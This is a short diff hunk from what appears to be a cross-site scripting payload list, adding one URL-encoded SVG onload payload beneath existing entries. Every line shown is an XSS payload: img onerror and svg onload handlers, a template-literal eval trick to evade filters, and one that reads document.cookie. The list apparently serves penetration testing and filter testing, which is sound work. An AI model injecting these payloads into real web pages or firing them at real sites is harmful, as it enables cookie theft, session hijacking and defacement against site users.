@@ -192,3 +192,4 @@ https:///%22%3E%3Cimg%20src=x%20onerror=alert(document.domain)%3E
 a=eval,c=["a"],x=["lert"],t=\${c}${x}(origin)`,http://a.call`1${t}``
 <Img Src=OnXSS OnError=confirm(document.cookie)>
 <img//////src=x oNlY=1 oNerror=alert('hacked_by_h6nt3r')//
+%3CSVG/oNlY=1%20ONlOAD=confirm(document.domain)%3E
